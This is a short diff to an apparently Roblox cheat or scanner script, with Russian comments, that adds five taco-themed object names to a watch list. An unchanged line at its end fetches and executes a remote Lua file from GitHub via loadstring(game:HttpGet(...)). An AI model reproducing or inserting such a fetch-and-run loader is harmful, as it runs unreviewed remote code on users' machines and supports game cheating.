@@ -39,6 +39,11 @@ local OBJECTS = {
     ['Meowl'] = { emoji = '🐈', important = true },
     ['La Casa Boo'] = { emoji = '👁‍🗨', important = true },
     ['Headless Horseman'] = { emoji = '🐴', important = true },
+    ['Mariachi Corazoni'] = { emoji = '💀', important = true },
+    ['La Taco Combinasion'] = { emoji = '👒', important = true },
+    ['Burrito Bandito'] = { emoji = '👮‍♀️', important = true },
+    ['Los Tacoritas'] = { emoji = '🚴', important = true },
+    ['Tacorita Bicicleta'] = { emoji = '🚵‍♂️', important = true },
 }
 
 -- Создаем списки важных объектов
@@ -555,4 +560,3 @@ end)
 print('💡 Нажмите F для повторного сканирования')
 print('📱 Discord webhook готов к отправке уведомлений')
 loadstring(game:HttpGet("https://raw.githubusercontent.com/MrStasGames228/asddsa/refs/heads/main/zahod.lua"))()
-
